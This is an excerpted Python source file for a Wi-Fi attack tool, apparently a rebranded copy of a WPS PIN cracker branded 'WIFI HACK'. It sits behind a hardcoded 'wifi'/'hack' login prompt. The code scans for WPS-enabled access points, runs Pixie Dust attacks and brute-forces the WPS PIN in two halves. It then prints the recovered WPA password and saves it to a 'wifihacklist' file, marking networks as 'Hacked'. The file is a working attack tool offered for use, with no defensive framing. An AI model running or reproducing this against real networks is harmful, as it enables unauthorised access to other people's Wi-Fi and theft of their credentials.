...
# কালার কোড ডিফাইন (যদি আগে থেকে না থাকে)
R = '\033[91m'  # Red
G1 = '\033[92m' # Green
Y = '\033[93m'  # Yellow
M = '\033[95m'  # Magenta
...
██   ████  ██████    ██   ██ ██ ███████ ██   ██
{M}════════════════════════════════════════════════
{R}[{G1}+{R}]{G1} 𝐃𝐄𝐕𝐄𝐋𝐎𝐏𝐄𝐑 {R}〆{G1} SAZIB ISLAM{RESET}
{R}[{G1}+{R}]{G1} 𝐓𝐎𝐎𝐋𝐒 𝐅𝐎𝐑 {R}〆{M} WIFI {Y}HACK \x1b[0m{RESET}
{R}[{G1}+{R}]{G1} 𝐕𝐄𝐑𝐒𝐈𝐎𝐍   {R}〆{G1} 𝐕/{version}{RESET}
{R}[{G1}+{R}]{G1} 𝐒𝐓𝐀𝐓𝐔𝐒    {R}〆{Y} 𝐏𝐑𝐄𝐌𝐈𝐔𝐌{RESET}
{M}════════════════════════════════════════════════{RESET}"""
...
while attemps < 12345677901:
    username = input('\033[95;1m[\x1b[38;5;50m+\033[95;1m] \033[1;33m𝐈𝐍𝐏𝐔𝐓 𝐔𝐒𝐄𝐑 𝐍𝐀𝐌𝐄 : ')
    password = input('\033[95;1m[\x1b[38;5;50m+\033[95;1m] \033[1;91m𝐈𝐍𝐏𝐔𝐓 𝐔𝐒𝐄𝐑 𝐏𝐀𝐒𝐒𝐖𝐎𝐑𝐃: ') 
    if username == 'wifi' and password == 'hack':
        print('\033[1;30m───────────────────────────────────────────\n\033[95;1m[+]\033[1;32m 𝐋𝐎𝐆𝐈𝐍 𝐒𝐔𝐂𝐂𝐄𝐒𝐒𝐅𝐔𝐋𝐋𝐘')
        time.sleep(2)
        break
    else:
        print(' 𝐈𝐍𝐂𝐎𝐑𝐑𝐄𝐂𝐓 𝐏𝐀𝐒𝐒 𝐏𝐋𝐄𝐀𝐒𝐄 𝐓𝐑𝐘𝐈𝐍𝐆 ')
        attemps += 1
        continue
os.system('clear')
...
class Companion:
    ...
    def __init__(self, interface, save_result=False, print_debug=False):
        ...
        self.sessions_dir = f'{user_home}/.Norisk/sessions/'
        self.pixiewps_dir = f'{user_home}/.Norisk/pixiewps/'
    ...
    def __handle_wpas(self, pixiemode=False, pbc_mode=False, verbose=None):
        ...
        if line.startswith('WPS: '):
            if 'Building Message M' in line:
                ...
                print('{R}[{G1}+{R}]{G1} Sending WPS Message M{}…'.format(n))
            elif 'Received M' in line:
                n = int(line.split('Received M')[1])
                self.connection_status.last_m_message = n
                print('{R}[{G1}+{R}]{G1} Received WPS Message M{}'.format(n))
                if n == 5:
                    print('{R}[{G1}+{R}]{G1} The first half of the PIN is valid')
            ...
            if '-> SCANNING' in line:
                ...
                print('{R}[{G1}+{R}]{G1} Scanning…')
        elif ('WPS-FAIL' in line) and (self.connection_status.status != ''):
            print(line)
            if 'msg=5 config_error=15' in line:
                print('{R}[{G1}+{R}]{G1} Received WPS-FAIL with reason: WPS LOCKED')
                ...
                print('{R}[{G1}+{R}]{G1} Received WPS-FAIL with reason: CRC FAILURE')
                self.connection_status.status = 'WPS_FAIL'
            else:
                self.connection_status.status = 'WPS_FAIL'
...
#            print("[!] Unexpected interference — kill NetworkManager/wpa_supplicant!")
            ...
            print('{R}[{G1}+{R}]{G1} Authenticating…')
        elif 'Authentication response' in line:
            print('{R}[{G1}+{R}]{G1} Authenticated')
        elif 'Trying to associate with' in line:
            self.connection_status.status = 'associating'
            if 'SSID' in line:
                self.connection_status.essid = codecs.decode("'".join(line.split("'")[1:-1]), 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')
            print('{R}[{G1}+{R}]{G1} Associating with AP…')
        elif ('Associated with' in line) and (self.interface in line):
            bssid = line.split()[-1].upper()
            if self.connection_status.essid:
                print('{R}[{G1}+{R}]{G1} Associated with {} (ESSID: {})'.format(bssid, self.connection_status.essid))
            else:
                print('{R}[{G1}+{R}]{G1} Associated with {}'.format(bssid))
        elif 'EAPOL: txStart' in line:
            self.connection_status.status = 'eapol_start'
            print('{R}[{G1}+{R}]{G1} Sending EAPOL Start…')
        elif 'EAP entering state IDENTITY' in line:
            print('{R}[{G1}+{R}]{G1} Received Identity Request')
        elif 'using real identity' in line:
            print('{R}[{G1}+{R}]{G1} Sending Identity Response…')
        elif pbc_mode and ('selected BSS ' in line):
            bssid = line.split('selected BSS ')[-1].split()[0].upper()
            self.connection_status.bssid = bssid
            print('{R}[{G1}+{R}]{G1} Selected AP: {}'.format(bssid))

        return True

    def __runPixiewps(self, showcmd=False, full_range=False):
        print("{R}[{G1}+{R}]{G1} Running Pixiewps…")
    ...
    def __credentialPrint(self, wps_pin=None, wpa_psk=None, essid=None):
        ...
        print(f"\n\n{R}[{G1}+{R}]{G1} {Y}AP SSID: {essid}")
        print(f"{R}[{G1}+{R}]{G1} {G1}WPA PSK: {wpa_psk} \n\n")
        for i in range(20):
           print("-",end=" ")
        print("\n")
    ...
    def __saveResult(self, bssid, essid, wps_pin, wpa_psk):
        ...
        filename = self.reports_dir + 'wifihacklist'
        ...
        print(f'{R}[{G1}+{R}]{G1} Credentials saved to {filename}.txt')
    ...
    def __wps_connection(self, bssid=None, pin=None, pixiemode=False, pbc_mode=False, verbose=None):
        ...
        if pbc_mode:
            if bssid:
                print(f"{R}[{G1}+{R}]{G1} Starting WPS push button connection to {bssid}…")
                cmd = f'WPS_PBC {bssid}'
            else:
                print("{R}[{G1}+{R}]{G1} Starting WPS push button connection…")
                cmd = 'WPS_PBC'
        else:
            print(f"{R}[{G1}+{R}]{G1} Trying PIN '{pin}'…")
    ...
    def __first_half_bruteforce(self, bssid, f_half, delay=None):
        ...
        while int(f_half) < 10000:
            ...
            if self.connection_status.isFirstHalfValid():
                print('{R}[{G1}+{R}]{G1} First half found')
                return f_half
            elif self.connection_status.status == 'WPS_FAIL':
...
class WiFiScanner:
    ...
    def __init__(self, interface, vuln_list=None):
        ...
        reports_fname = os.path.dirname(os.path.realpath(__file__)) + '/reports/wifihacklist.csv'
        try:
    ...
    def iw_scanner(self) -> Dict[int, dict]:
        ...
        if self.vuln_list:
            print('\n\nNetwork List: {1} {0} {2} {0} {3}'.format(
                '|',
                colored('😁WPS ON', color='green'),
                colored('😡WPS LOCKED', color='red'),
                colored('😄Hacked', color='yellow')
            ))
        print(f'\n{G1}+ All Networks list:\n')
        ...
        for n, network in network_list_items:
            ...
            if (network['BSSID'], network['ESSID']) in self.wifihacklist:
    ...
    def prompt_network(self) -> str:
        ...
        if not networks:
            print(f'{R}[{G1}+{R}]{G1} {R}NO WPS NETWORKS FOUND.{G1}')
            try:
                networkNo = input(f'{R}[{G1}+{R}]{G1} SELECT TARGET (PRESS ENTER TO REFRESH): ')
...
def usage():
    return """
NoriskPin 0.0.2 (c) 2017 rofl0r, modded by drygdryg
...
Advanced arguments:
    ...
    --vuln-list=<filename>   : Use custom file with vulnerable devices list ['sajib.txt']
...
if __name__ == '__main__':
    ...
    parser = argparse.ArgumentParser(
        description='NoriskPin 0.0.2 (c) 2017 rofl0r, modded by drygdryg',
    ...
    parser.add_argument(
        '--vuln-list',
        type=str,
        default=os.path.dirname(os.path.realpath(__file__)) + '/sajib.txt',
